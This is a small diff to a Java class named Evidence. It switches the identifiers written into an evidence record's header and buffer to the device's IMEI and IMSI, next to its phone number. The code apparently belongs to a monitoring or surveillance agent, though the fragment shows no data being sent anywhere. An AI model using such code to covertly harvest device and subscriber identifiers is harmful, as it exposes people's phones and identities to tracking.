@@ -360,8 +360,8 @@ public final class Evidence {
 		evidenceDescription.hTimeStamp = datetime.hiDateTime();
 		evidenceDescription.lTimeStamp = datetime.lowDateTime();
 		evidenceDescription.additionalData = additionalLen;
-		evidenceDescription.deviceIdLen = WChar.getBytes(device.getDeviceId()).length;
-		evidenceDescription.userIdLen = WChar.getBytes(device.getUserId()).length;
+		evidenceDescription.deviceIdLen = WChar.getBytes(device.getImei()).length;
+		evidenceDescription.userIdLen = WChar.getBytes(device.getImsi()).length;
 		evidenceDescription.sourceIdLen = WChar.getBytes(device
 				.getPhoneNumber()).length;
 
@@ -378,8 +378,8 @@ public final class Evidence {
 
 		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0, plainBuffer.length);
 		databuffer.write(baseHeader);
-		databuffer.write(WChar.getBytes(device.getDeviceId()));
-		databuffer.write(WChar.getBytes(device.getUserId()));
+		databuffer.write(WChar.getBytes(device.getImei()));
+		databuffer.write(WChar.getBytes(device.getImsi()));
 		databuffer.write(WChar.getBytes(device.getPhoneNumber()));
 
 		if (additionalLen > 0) {
